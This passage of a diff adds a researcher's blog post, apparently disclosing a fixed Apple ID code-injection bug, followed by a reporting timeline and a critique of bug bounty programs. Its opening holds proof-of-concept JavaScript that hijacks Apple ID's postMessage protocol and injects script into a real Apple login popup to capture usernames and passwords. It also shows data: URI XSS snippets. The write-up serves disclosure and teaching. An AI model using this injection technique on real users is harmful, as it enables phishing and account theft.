+    if (window.top.frames[i] != idmsa.contentWindow) continue;
+    ifmsaFrameId = i;
+    break
+}
+
+
+window.addEventListener("message", e => {
+    console.log("RCV", e);
+
+    // we need to wait for the null page to postMessage
+    // us to tell us it exists. This way of doing it
+    // is ... not entirely kosher but it works for our
+    // purposes.
+    if (e.data == "ready") return nullPage.postMessage(config, "*");
+
+    // the postmessage JSONRPC protocol that apple id uses
+    // prefixes everything with this string. We need to trim
+    // it off, but also do this ourselves in our communications.
+    const prefix = "pmrpc.";
+
+    if (!e.data.startsWith(prefix))
+        throw new Error(`got weird message ${JSON.strigify(data)}`);
+
+    // I'm sure there's a real trimPrefix function somewhere
+    // but i'm not in the business of following the rules
+    // right now.
+    const json = e.data.slice(prefix.length);
+
+    const rq = JSON.parse(json);
+
+    // extracting the stuff from the request that will be reused
+    // for our response.
+    const { method, jsonrpc, params , id } = rq;
+
+    // share the good news when we steal your apple login
+    if (method == "passwordAuthDone") alert(`got creds! ${
+        JSON.stringify(params)
+    }`);
+
+    // same if we also get a 2FA'd set of creds
+    if (method == "complete") alert(`got creds! ${
+        JSON.stringify(params)
+    }`);
+
+    // config requests are the complicated ones.
+    // we merge our template with the jsonrpc version
+    // and the request id for our response.
+    if (method == "config") return nullPage.postMessage(
+        `${prefix}${JSON.stringify({
+            ...config_resp, jsonrpc, id
+        })}`, "*";
+    )
+
+    // for all other requests, we just let the page know
+    // that everything is OK ;)
+    nullPage.postMessage(`${prefix}${JSON.stringify({
+        jsonrpc, id, result: true
+    })}`, "*");
+})
+
+// prepare the config to send to the null page
+const config = {
+    idmsaFrameId,
+    type: "config"
+}
+</script>
+```
+
+That about covers the basics of how our vulnerability works. We need to do one more thing to truly 'steal the bank', though. We need to escape into an `idmsa.apple.com` popup once our attack succeeds. Partially so it's harder to trace us, but also because having `idmsa.apple.com` in the url bar makes it impossible for even the most paranoid to suspect something awry. This makes our `injection` function a bit more complicated.
+
+Warning: this code is really hacky.
+
+```javascript
+const injection = () => {
+    // we want to get rid of the evidence as soon as we can.
+    // once our popup is initialized, it passes us a message
+    // which we then pass onto our parent exploit window.
+    // it can then use location.assign() to remove us
+    // from the browser history.
+    window.addEventListener("message", ({data}) => {
+    if(data != "CLOSE") return;
+        window.parent.postMessage("CLOSE", "*");
+        window.close();
+    })
+
+
+    // the 'Sign in With Apple' button, stolen right from
+    // the brand guidelines
+    const appleLoginImage = "https://developer.apple.com/design/human-interface-guidelines/sign-in-with-apple/images/apple-id-sign-in-with.png";
+
+    // This is a legitimate apple login page.
+    // we pop this out and escape into it.
+    const legitLogin = "https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=49bd208126787c17c33ca3b14d2a4f0c92daa10c417c4d686140e4acc04ba5f4&language=US-EN&path=/Login.do%3FmyInfoReturnURL%3DRegisterAgreement.do%253Fskip%253Dyes%253Fskip%253Dyes";
+
+    // create the 'Sign in With Apple' button.
+    const i = document.createElement("img");
+    i.src = appleLoginImage;
+
+    // when the button is clicked, we popout our
+    // 'legit' login page.
+    //
+    // A click is needed due to anti-popup browser measures.
+    // we could equally use another input like pressing a key,
+    // but this I think arouses the least suspiscion.
+    i.addEventListener('click', () => {
+    const myWnd = window.open(legitLogin);
+
+    // once we've opened the legit login page, we won't
+    // know when it's actually ready to inject into.
+    // so we just keep injecting over and over again
+    // every tenth of a second until we get a signal
+    // back to say the injection succeedd.
+    setInterval(() => {
+        // injecting code across windows and origins like this
+        // is *really* annoying. unless you've done it before
+        // the full scope of annoyance will be blissfully unknown
+        // to you.
+        //
+        // Because of the way Javascript internals work, each `window`
+        // is its own namespace, so when we document.createElement --
+        // which is secretly window.document.createElement,
+        // we actually make an element that's specific to our
+        // window.
+        //
+        // This fuckery is beyond us at this point
+        // so it's easiest to just inject scripts and have
+        // them run natively in the attacked window.
+        const toInject = () => {
+        
+        // A nice little touch :)
+        document.querySelector("#signin").innerHTML = document.querySelector("#signin").innerHTML.replace(/Apple Support/g, "your free iPhone");
+        document.querySelector("form[name=form1]").setAttribute("onsubmit", "");
+
+        // override the submit action for the form
+        // to steal the user's username and password.
+        document.querySelector("form[name=form1]").addEventListener('submit',() => {
+            alert(`${
+            document.querySelector("#accountname").value
+            } / ${
+            document.querySelector("#accountpassword").value
+            }`);
+        });
+
+        // once initialized, post to the page that created
+        // us that it can close now.
+        window.opener.postMessage("CLOSE", "*");
+        }
+
+        // get a reference to the document of the popped out
+        // window and inject the attack code we just defined.
+        const doc = myWnd.document;
+        const s = (doc.body || doc.documentElement).appendChild(
+        doc.createElement.call(doc, "script")
+        );
+        s.innerHTML = `(${toInject})()`;
+    }, 100);
+    });
+
+    // this is awful. do not do this.
+    // it's a really quick way to clear a page of content though :)
+    document.body.innerHTML = "";
+
+    // and finally, add the button which will kick it all off
+    document.body.appendChild(i);
+}
+```
+
+We also make this minor change to our 'message' listener to destroy ourselves after the attack completes:
+
+```javascript
+      if (e.data == "CLOSE") window.location.replace("https://apple.com")
+```
+
+
+## Postamble
+
+### Timeline
+
+- Report to fix time: **3 days**
+- Fix to offer time: **4 months, 3 days**
+- Payment offer to payment time: **4 months, 5 days**
+- Total time: **8 months, 8 days**
+
+Reporting this bug was a frustrating experience. But, can I really complain about that? These days, it always is.
+
+In short: I reported two bugs in late 2019, both of which were fixed within less than a week. The second bug, the Apple ID code injection took 18 weeks to get accepted and 36 weeks to get paid for. The other, as far as I can tell has never been responded to by a human. I have not been publicly credited for either bug.
+
+1. *Friday, November 15th 2019*
+    - First apple bug, an XSS on apple.com reported
+2. *Saturday, November 16th 2019*
+    - Issues noticed in Apple ID
+    - The previous bug I reported has been mitigated, but no email from Apple about it
+2. *Thursday, November 21st 2019, 3:43AM GMT*
+    - First proof of concept sent to Apple demonstrating impersonating iCloud to Apple ID, using it to steal Apple user's information.
+3. *Thursday, November 21st 2019, 6:06AM GMT*
+    - Templated response from Apple, saying they're looking into it
+4. *Thursday, November 21st 2019, 8:20PM GMT*
+    - Provided first Apple ID proof of concept which injects malicious code, along with some video documentation.
+5. *Sunday, November 24th 2019*
+    - The issue is mitigated (partially fixed) by Apple
+6. *Thursday, November 28th 2019*
+    - Ask for updates
+7. *Wednesday, December 4th 2019*
+    - I try to pull some strings with friends to get a reply
+8. *Tuesday, December 3rd 2019*
+    - Apple tells me there is nothing to share with me
+9. *December 10th 2019*
+    - I ask if there is an update
+9. *Friday, January 10th 2019*
+    - I get an automated email saying, in essence (1) don't disclose the bug to the public until 'investigation is complete' and (2) Apple will provide information over the course of the investigation. Email for an update
+9. *Wednesday, January 29th 2020*
+    - Ask for another update (at the 2 month mark)
+10. *Friday, January 31st 2020*
+    - Am asked to check if it's been fixed. Yes, but not exactly in the way I might have liked.
+11. *Sunday, February 2nd 2020*
+    - At Schmoocon, a security conference in Washington DC I happen to meet the director of the responsible disclosure program. I talk about the difficulties I've had.
+11. *Tuesday, February 4th 2020*
+    - Apple confirms the bug as fixed and asks for my name to give credit on the [Apple Hall of Fame] **as of September 2020, I have still not been publicly credited*
+    - I reply asking if this is covered by the bounty program
+    - Apple responds saying that they will let me know later.
+12. *Saturday, February 15th 2020*
+    - I ask for an update on status
+13. *Monday, February 17th 2020*
+    - Apple responds: no updates
+    - I ask when I'll hear back
+99. *Friday, February 21st 2020*
+    - I contact the director of the program with the details I got at schmoo, asking when the expected turnaround on bugs is
+14. *Monday, March 2nd 2020*
+    - Apple responds
+    - They say they have no specfic date
+99. *Tuesday, March 3rd 2020*
+    - The director responds, saying they don't give estimates on timelines, but he'll get it looked into
+15. *Tuesday, March 24th 2020*
+    - Offered $10,000 for the Apple ID code injection vulnerability by Apple
+    - Asked to register as an appple developer so I can get paid through there
+16. *Sunday, March 29th 2020*
+    - Enroll in the Apple Developer program, and ask when I'll be able to disclose publicly.
+17. *Tuesday, March 31st 2020*
+    - Told to accept the terms and set up my account and tax information
+    - (I am not told anything about disclosure)
+18. *Tuesday, March 31st 2020*
+    - Ask for more detailled instructions, because I can't find out how to set up my account and tax information (this is because my Apple Developers application has not yet been accepted)
+19. *Thursday, April 2nd 2020*
+    - Ask if this is being considered as a generic XSS (the [Apple Bug Bounty][Apple Bug Bounty Payouts] page quotes a $25,000 payout for "limited unauthorized control of an iCloud account" and $100,000 for "Broad unauthorized control of an iCloud account."[^4])
+99. *Tuesday, April 28th*
+    - Apple replies to request for more detailed instructions (it's the same thing, but re-worded)
+20. *May 13th 2020*
+    - I ask for an update
+21. *May 18th 2020*
+    - Am told the money is "in process to be paid", with no exact date but expected in May or early June. They'll get back when they know.
+22. *May 23rd 2020*
+    - I am told my information has been sent to the accounts team, and that Apple will contact me about it when appropriate
+23. *May 18th 2020*
+    - I ask again when I can disclose
+24. *June 8th 2020*
+    - I ask for some kind of update on payment or when I can disclose
+25. *June 10th 2020*
+    - I am informed that there is 'a new process'
+    - The new process means I pay myself for my Apple Developers account, and Apple reimburses me that cost
+    - I tell Apple I did this several months ago, and ask how my bug was classified within the program
+    - I also contact the Apple security director asking if I can get help. He's no longer with Apple
+27. *June 15th 2020*
+    - Apple asks me to provide an 'enrolment ID'
+28. *June 15th 2020*
+    - I send apple a screenshot of what I am seeing. All my application shows is 'Contact us to continue your enrolment'
+    - I say I'm pretty frustrated and threaten to disclose the vulnerability if I am not given some way forward on several questions: (1) how the bug was classified (2) when I can disclose this and (3) what I am missing to get paid
+    - I also [rant about it on twitter](https://twitter.com/zemnmez/status/1272638710832599043), which was probably the most productive thing I did to get a proper response in retrospect
+29. *June 19th 2020* 
+    - Apple gets in touch, saying they've completed the acccount review and now I need to set up a bank account to get paid in
+    - Apple says they're OK with disclosing, as long as the issue is addressed in an update
+    - Apple asks for a draft of my disclosure
+30. *Thursday, July 2nd 2020*
+    - The Apple people are very gracious. They say thanks for the report, and say my writeup is pretty good. Whoever is answering is very surprised by, and asks me to correct where I say I found this bug only "a few days ago" in the draft I wrote 🤔
+31. *July 29th 2020*
+    - I get paid :D
+
+### Reporting Vulnerabilties Sucks.
+
+Like many problems, information security seems deceptively put-together when observed from the outside. Occasionally, through the press you'll hear about some incredibly impactful vulnerability that seems mind-bogglingly complex, an event in-and-of itself to have been found.
+
+But behind all that, what doesn't end up being reported is the nitty-gritty of the actual interaction of reporting. When I talk to people about it, the impression I get is that people generally think that companies [and other entities][how to hack the uk tax system] who at least *do* think about security in a positive way should *jump* at the opportunity to fix some danger in their software. If only it were so simple.
+
+[how to hack the uk tax system]: https://medium.com/@Zemnmez/how-to-hack-the-uk-tax-system-i-guess-3e84b70f8b
+
+#### Making a Report
+
+There are many moving parts here, but there are some major players when it comes to this complication, beginning at the actual disclosure point. A disclosure is when someone who has found a security vulnerability tells somebody, usually the 'good guys', who make the software.
+
+There is no standard way of reporting a vulnerability.
+
+People in the security industry will tell you that usually, there is someone at the end of the 'security@' email address -- someone, hopefully associated with security. Maybe. Other than the somewhat old-world approach of simply [posting the vulnerability in full][buffalo nas remote shutdown] on a mailing list, this is the oldest way of disclosing a vulnerability that has some respect associated with it.
+
+[buffalo nas remote shutdown]: https://packetstormsecurity.com/files/135368/Buffalo-NAS-Remote-Shutdown.html
+
+Some people swear by emailing security@. You'd think that wouldn't be so controversial, but the other approches *usually* incur rather frustrating legal responsibilities.
+
+Oh bug bounties! They were *so* exciting when they first came into being. What must be understood about bug bounties is that they're not what I think most people assume they are, and what most people assumed they'd be when they were first concieved. A bug bounty is not simply a responsible disclosure with a few strings attached and some associated compensation.
+
+Always, or at least virtually always, reporting to a bug bounty program means signing a legal agreement, implicitly or otherwise that the ball is in the court of the program runners as to whether the public gets to know about the vulnerability, and, whether the vulnerability is ultimately of any value. And that's key.
+
+#### Triage
+
+It is difficult to discuss this topic as fully as I'd like, due to the reprocussions I'd have if I mentioned specific events, but in short, people are extremely biased when it comes to assessing the severity of a vulnerability.
+
+In particular, a trend you'll notice is that people consider vulnerabilties that they can intuitively understand the inner workings of to be much more severe than the vulnerabilities they can't -- modified only slightly by the classic calc.exe proof of concept. This is fed continuously by the *culture* of bug bounties.
+
+In the early days, one might have naiively assumed that bug bounties would look like responsible disclosures, in the sense that they'd reflect the capabilties of the seucurity community as a whole. If there are people out there who can mess with a particular system, they'll write a few words on it, pass it over to the bug bounty program and have them fix it for some money and then ideally the ability to inform the wider security community.
+
+A lot of this, in my opinion is about the allocation of security resources in all but the most careful and hands-on programs (by which I probably mean just Google, and then, some of the time). Whatever you're reporting, if it's a long chain of complex vulnerabilities that rely on application-specific security holes, or if it's the 1000th XSS you've reported in a particularly commonly deployed system, it gets the same attention.
+
+In concrete terms, vulnerabilities of the kind I describe here are not really worth it. If you know people in bug bounties, what you'll understand is that the key piece in making good money is not the amount you know about a specific system, though that does come into play -- but it's usually all about recon and knowing the security landscape well.
+
+You want to be reporting ideally the *same* vulnerability 1000 times across many different bounty program providers, because reporting vulnerabilities sucks. You want to find a *category* of vulnerability that covers many disclosure programs and many hosts.
+
+If you report a common pattern of well-understood vulnerability in a shallow vulnerability chain, where it's easy to demonstrate the impact of the vulnerability without having to get into application-specific security guarantees, then you have the best chance of both the triager who goes through a *lot* of these per day and the person who decides whether to release funds wanting to discuss it with you.
+
+This same story has played out in pretty much every notable vulnerability that I've ever reported.
+
+#### The Burden of Proof
+
+A problem that seems simple, but which is not: how much does a vulnerability reporter have to prove to prove that they've found a notable vulnerabilty? The answer is, really: 'it depends on the vulnerability type'.
+
+XSS, has for years had the burden of proof that you simply need to make a call to `alert(1)` in Javascript to demonstrate that you have control over the domain. But in reality, this is more of a convention than a true proof of control. I have had reported to programs that I've run, vulnerabilities which are *deceptively* piss-poor.
+
+For example, I once had someone report an XSS that worked via '`data:`' URIs. When `data:` URIs were first introduced, the concept was that an HTML document could include some data -- for example an image -- *in the same page*, without having to load *another file* from the webserver (a process which in HTTP has non-zero overhead). Here's a simple example:
+
+```HTML
+<img src='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="3" fill="white" stroke="black"/></svg>'/>
+```
+
+<img src='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="3" fill="white" stroke="black"/></svg>'/>
+
+This is a simple SVG image that is defined inline in the HTML document. It'd normally, at least at the time that `data:` was introduced need to be a separate file, requested separately.
+
+As `data:` URIs were part of the page they were loaded from, the decision was made that they should inherit the origin (i.e. domain) of the page that they come from. This means that a link, `<a href="data:text/html,Hello!">click me!</a>` when clicked goes to a synthetic `data:` page which is considered in the browser security model to be part of its page it was linked from.
+
+This created a new place that XSS could happen when attacker code gets into a page (what in the industry is called a 'sink'). Since the `data:` assset is part of the parent page, `<a href="data:text/html,<script>alert(1)</script>">click me!</a>` creates a link which runs Javascript code in the context of the parent domain -- it's XSS.
+
+Then, further down the line this was understood to be a mistake, or, at least, unnecessary. Not many people ever needed to make use of these synthetic pages inheriting the parent domain in a non-malicious way, so `data:` URIs got moved to a 'null' origin, and the XSS was solved perhaps. The <a href="#" onClick={() => { window.event.preventDefault(); alert(1) }}>pop-up</a> would still come up, but it'd just be sandboxed into being not all that worrying.
+
+I wasn't aware of this, and someone who I knew was sending this exact vulnerability to every program they had access to sent me a `data:` uri XSS of this kind that popped up `alert(1)`. I paid for it, and then, testing further realised that it had no security effect.
+
+That was pretty frustrating, especially since I realised what an incredibly good idea this was from a bounty perspective as this bug was present in a *ton* of places, and, *maybe* 10% of program runners would know that particular quirk to deny paying you the $500-$1000?
+
+This is all anecdotal, of course but I hope I've illustrated my point that burdens of proof are conventions more than anything.
+
+When I reported my well-covered [Steam code execution][XSS in steam react chat client], I actually initially said this:
+
+[XSS in steam react chat client]: https://hackerone.com/reports/409850
+
+> The Steam chat client both sends and receives bbcode format chat messages. These map to HTML elements, and notably the `[url]` bbcode tag is supported for arbitrary URLs.
+>
+> [...]
+>
+> I strongly believe an attacker could get remote code execution in Steam via this method. The Steam chat client uses the same codebase as the steam web chat client, and, I imagine does so using electron or some other webview system. These systems all expose functions which allow arbitrary calls to system to allow them to be competitive with e.g. windows forms.
+
+The response to this was ... well ... 'sure, you've got an XSS, but you haven't proven Remote Code Execution'. And, I mean -- fair, sure, that actually *is* an accurate description of what I have there. After 10 days more back and forth, and some more research I proved that, yes, being able to have XSS means that you have remote code execution in Steam.
+
+And if it took me 10 days to prove, it would have taken maybe 1 day? 2 days? to check the relevant block of source code which, of course the program managers have access to to see if it's the case. I really hate that.
+
+Sure, I got paid for the bug, but I also don't get out of bed in the morning so I can get paid what amounts to usually hush money by corporations for their security failings. I report this stuff because I find the technical challenge interesting, and because I want people to be secure online. I only really want two things:
+
+1. My exploit to be recognised as as impactful as I think it is, and
+2. To be able to talk about it.
+
+It's somewhat perverse to me that a company can pay me $7,500 for a security vulnerability, but can't afford to pull a single engineer over to read the source code and validate my claim.
+
+I'm sure it sounds like petty complaining, but it matters for security in the long run. Is the issue here really that I can get some XSS in a Steam chat client, or that the XSS in the chat client results in *literally taking over your computer*? If Valve's mitigation is anything to go by, it's the latter, and if I'd just left this as they were that's where we'd still be.
+
+The burden of proof here is not in my favour, because the Steam chat client is simply not a common codebase. It's descended from an embedded web browser that pre-dates the modern offering, [electron](https://electronjs.org).
+
+#### Disclosure
+
+Disclosing vulnerabilities, despite commonly being touted as the most important step in reporting a vulnerability, sucks. In so many ways.
+
+First, if you want to see any kind of compensation for your bug, you better have contacted the software maker via their bug bounty program. But doing so means that you can't disclose the bug unless they want you to. Anyone who knows the history of computer security can see why that's a problem.
+
+Now, I can't say *why* my last, and second $7,500 vulnerability reported to Valve is not disclosed to the public, *or* why the $750 payout below it is not disclosed to the public. That simply wouldn't be allowed.
+
+<img src={require('./valve_disclosure.png')} />
+
+I *can* say that I reached out to the vulnerability disclosure platform myself and was informed that, probably, it's never going to become public. And I *think* I can say that the $7,500 disclosure ticket appears to have a draft of some kind of pinned disclosure notice that attempts to downplay the vulnerability's severity.
+
+Where disclosure is not outright denied, or adversarial it's usually slow. And I mean, on the order of significant fractions of a year slow. That's a bit of a problem for me specifically I suppose. As someone with ADHD, I rarely can engage myself 8+ months after the fact enough to put together something that's worth reading about even the most interesting vulnerabilties I've come up with.
+
+Since the disclosure is granted on the basis of having an actual *disclosure post*, I can't *really* even talk about in passing some of the most exciting vulnerabilities I've ever written.
+
+I've started migitating the *vast* times to disclosure with my own strategy of documenting the vulnerability *before* I disclose it and all the evidence is removed. Such was the case for that unnamed and censored Valve vulnerability. I wrote a full writeup for it with pictures and videos before it was even fixed. This took a lot of time as you can imagine, and I wrote it all in the 'summary' section that is visible to the program manager. Little did I expect that all that work would be for nothing.
+
+### Going Cold Turkey
+
+Here's that last tidbit I was working towards: I found, and then reported this bug to Apple *because* I didn't expect to get paid for it. At the time, sure, Apple did have a bug bounty program, but it was private -- which means that reporting a bug usually only gives you the *chance* to be *invited* to be paid for bugs in future. More importantly, perhaps -- Apple didn't have a proper bug bounty legal agreement, which meant that I couldn't (in theory) be slapped with a lawsuit for disclosing the bug online if they dragged their feet.
+
+I just wanted to find something interesting and write about it. But, well, as you probably know, Apple started a public bug bounty pretty much at the same time as I made my report. In actuality, I made more than one report, if you've read the [timeline]. I had every intention of publishing the disclosure as soon as possible, and Apple be damned, if they dragged their feet I'd just publish online. Well, that didn't happen, and here we are, a year later.
+
+I spent good months arguing about this one, and I still feel like it didn't get the severity rating it deserved, and I still haven't been paid for the two bugs I reported before this one!
+
+## Thanks, Farewell {#thanks_farewell}
+
+I've learned that it literally takes me a year to put together a disclosure I like. Sorry about that, but also, it's a lot more fulfilling to just go all in on one article.
+
+Special shout out to [Alex][@mangopdf], who is always encouraging about my writing, despite putting out more and better stuff than me on a regular basis.
+
+Also shout out to all the people who looked at earlier versions of this doc: [Tavis], [Perribus], [Mandatory], [Sam][sam sheffer].
+
+[tavis]: https://twitter.com/taviso
+[perribus]: https://twitter.com/perribus
+[mandatory]: https://twitter.com/iammandatory
+[sam sheffer]: https://twitter.com/samsheffer
+
+[@mangopdf]: https://twitter.com/mangopdf
+
+PS: Apple people: the bug IDs are: 724779810, 724415224 and 724779810
+
+
+*/}
+
+
+
+{/*
+[^3]:
+    Here's the list of example payouts [at the time of reporting][Apple Bug Bounty Payouts]:
+
+    > **Example Payouts**
+    >
+    > Bounty payments are determined by the level of access or execution obtained by the reported issue, modified by the quality of the report. Issues that are unique to designated developer or public betas, including regressions, can result in a 50% additional bonus if the issues were previously unknown to Apple. All security issues with significant impact to users will be considered for Apple Security Bounty payment, even if they do not fit the published bounty categories.
+    > 
+    > |   |    |    |
+    > | --- | --- | --- |
+    > | Unauthorized iCloud Account Access | $25,000 | Limited unauthorized control of an iCloud Account |
+    > | | $25,000 |  Limited unauthorized control of an iCloud account |
+    > | | $100,000 |  Broad unauthorized control of an iCloud account |
+    > | Physical Access to Device: Lock Screen bypass | $25,000 | Access to a small amount of sensitive data from the lock screen (but not including a list of installed apps or the layout of the home screen). |
+    > |  | $50,000 | Partial access to sensitive data from the lock screen. |
+    > |  | $100,000 | Broad access to sensitive data from the lock screen. |
+    > | Physical Access to Device: User Data Extraction | $100,000 | Partial extraction of sensitive data from the locked device after first unlock. |
+    > |   | $250,000 | Broad extraction of sensitive data from the locked device after first unlock. |
+    > | User-Installed App: Unauthorized Access to Sensitive Data | $25,000 | App access to a small amount of sensitive data normally protected by a TCC prompt. |
+    > |     | $50,000  | Partial app access to sensitive data normally protected by a TCC prompt. |
+    > |      | $100,000 | Broad app access to sensitive data normally protected by a TCC prompt or the platform sandbox. |
+    > | User-Installed App: Kernel Code Execution | $100,000 | Kernel code execution reachable from an app. |
+    > |    | $150,000 |  Kernel code execution reachable from an app, including PPL bypass or kernel PAC bypass. |
+    > | User-Installed App: CPU Side-Channel Attack | $250,000 | CPU side-channel attack allowing any sensitive data to be leaked from other processes or higher privilege levels. |
+    > | Network Attack with User Interaction: One-Click Unauthorized Access to Sensitive Data | $75,000  | One-click remote partial access to sensitive data. |
+    > |      | $150,000 | One-click remote broad access to sensitive data. |
+    > | Network Attack with User Interaction: One-Click Kernel Code Execution | $150,000 | One-click remote kernel code execution. | 
+    > |      | $250,000 | One-click remote kernel code execution, including PPL bypass or kernel PAC bypass. |
+    > | Network Attack without User Interaction: Zero-Click Radio to Kernel with Physical Proximity | $50,000 |  Zero-click code execution on a radio (e.g. baseband, Bluetooth or Wi-Fi) with only physical proximity, with no escalation to kernel. |
+    > |    | $200,000 | Zero-click partial access to sensitive data, with only physical proximity. |
+    > |    | $250,000 | Zero-click kernel code execution, with only physical proximity. |
+    > |  Network Attack without User Interaction: Zero-Click Unauthorized Access to Sensitive Data  | $100,000 | Zero-click attack that can turn on and collect information from a sensor (e.g., camera, microphone, or GPS). |
+    > |     | $250,000 | Zero-click partial access to sensitive data, without physical proximity. |
+    > |    | $500,000 | Zero-click broad access to sensitive data. |
+    > | Network Attack without User Interaction: Zero-Click Kernel Code Execution with Persistence and Kernel PAC Bypass | $1,000,000 | Zero-click remote chain with full kernel execution and persistence, including kernel PAC bypass, on latest shipping hardware. |
+    >
+    > *Notes and Definitions*
+    > 
+    > “One-click” refers to an exploit requiring user interaction to successfully gain access or execution. (For example, the user clicks a malicious link or opens a malicious file.)
+    >
+    > “Zero-click” refers to an exploit requiring no user interaction to successfully gain access or execution. (For example, being on a network or in proximity is sufficient.)
+    >
+    > “Sensitive data” access includes gaining a small amount (i.e., one or two items), partial access (i.e., some large number), or broad access (i.e., the full database) from Contacts, Mail, Messages, Notes, Photos, or real-time or historical precise location data — or similar user data — that would normally be prevented by the system.
+    > 
+    > The top payouts in each category are reserved for high quality reports and are meant to reflect significant effort, and as such are applicable to issues that impact all or most Apple platforms, or that circumvent the full set of latest technology mitigations available. Payouts vary based on available hardware and software mitigations that must be bypassed for successful exploitation.
+    >
+    > There is a $5,000 minimum payout for all categories.
+    >
+    > |    | Topic | Maximum Payout |
+    > | -- | ----- | -------------- |
+    > | iCloud | Unauthorized access to iCloud account data on Apple Servers | $100,000 |
+    > |  Device attack via physical access | Lock screen bypass | $100,000 |
+    > |                                    | User Data Extraction | $250,000 |
+    > | Device attack via user-installed app | Unauthorized access to sensitive data** | $100,000 |
+    > |                                    | Kernel code execution | $150,000 |
+    > |                                    | CPU side channel attack | $250,000 |
+    > | Network attack with user interaction | One-click unauthorized access to sensitive data** | $150,000 |
+    > |                                 | One-click kernel code execution | $250,000|
+    > | Network attack without user interaction | Zero-click radio to kernel with physical proximity | $250,000 |
+    > |            | Zero-click unauthorized access to sensitive data** | $500,000 |
+    > | Zero-click kernel code execution with persistence and kernel PAC bypass | $1,000,000 |
+    > 
+    > ** Sensitive data includes contents of Contacts, Mail, Messages, Notes, Photos, or real-time or historical precise location data.
+*/}
+
+[Apple Bug Bounty]: https://web.archive.org/web/20200104173530/https://developer.apple.com/security-bounty/
+[Apple Hall of Fame]: https://support.apple.com/en-gb/HT201536
